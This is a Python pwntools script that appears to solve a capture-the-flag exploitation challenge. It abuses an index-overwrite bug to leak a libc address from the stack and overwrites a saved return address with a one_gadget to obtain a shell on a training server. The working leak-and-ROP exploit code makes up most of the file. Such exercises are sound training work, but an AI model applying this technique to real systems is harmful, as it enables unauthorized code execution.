from pwn import *

#First I leak the text section in order to have the base address and then sum the offset of the gadget. To do this,
#I noticed that the index of the buffer is overwritten when the index reaches the value X = num//2+1. I also noticed that
#when i insert -1 the index of the buffer is increased even if after i can't write the new number (because -1 stops the
#insertion of the numbers). I exploited these vulnerabilities by inserting random numbers until I reach the value X: here
#I write the index of the value that I want to overwrite and in this way I can write in whatever location I want (but the index has to
#be less than the value corresponding to the number of values I want to insert). So, I leak the text section address (actually the base address of the program) by modifying
#the index with the value of sEIP and writing -1 to not modify the value of sEIP. After I printed the number and I obtain
#the address of the text section. I repeat the same procedure to leak a LIBC address. Finally I build the rop chain using
#a magic gadget. Before of it, I insert random numbers and also the index corresponding to the sEIP in order 
#to be able to replace it with the address of the magic gadget.


context.arch = 'amd64'

def add_numbers(p, num: int, numbers, is_final: bool):
    p.sendline(b"0")
    p.recvuntil(b"How many would you add?> ")
    p.sendline(str(num))
    for i in range(num + 1):
        p.recvuntil(b"#> ")
        p.sendline(str(numbers[i])) #overwrite index when i == num//2 + 1
        if(numbers[i] == -1):
            break
    if(is_final == False):
        p.recvuntil(b"> ")

def print_numbers(p):
    list_numbers = []
    p.sendline(b"1")
    for _ in range(200):
        num = p.recvuntil(b"\n")[:-1]
        list_numbers.append(num)
    p.recvuntil(b"> ")
    return list_numbers


OFFSET_LEAK_LIBC_BASE = 171408
OFFSET_BASE = 5298
ONE_GADGET_OFFSET = 0xebdaf
OFFSET_GADGET  = 0x0101a
NUMBER_TO_WRITE_FOR_INDEX_28 = 120259084288
NUMBER_TO_WRITE_FOR_INDEX_48 = 206158430208
NUMBER_TO_WRITE_FOR_INDEX_51 = 219043332096

#p = process("./positiveleak")
p = remote("bin.training.offdef.it", 3003)

"""gdb.attach(p, '''
    b setvbuf     
''')
input("wait")"""

#leak libc
input_list = [0 for _ in range(43)]
output_list = []
input_list.append(NUMBER_TO_WRITE_FOR_INDEX_51)
input_list.append(-1)
add_numbers(p, 80, input_list, False)
output_list = print_numbers(p)
leak_libc = output_list[51]
leak_libc = int(leak_libc, 10)
print(leak_libc)
libc_base_address = leak_libc - OFFSET_LEAK_LIBC_BASE
print(hex(libc_base_address))
target = libc_base_address + ONE_GADGET_OFFSET


#ROP CHAIN to overwrite the seip of the other stack frames
input_list = [0 for _ in range(43)]
input_list.append(NUMBER_TO_WRITE_FOR_INDEX_48)
input_list.append(target)
input_list.append(-1)
add_numbers(p, 80, input_list, True)

p.interactive()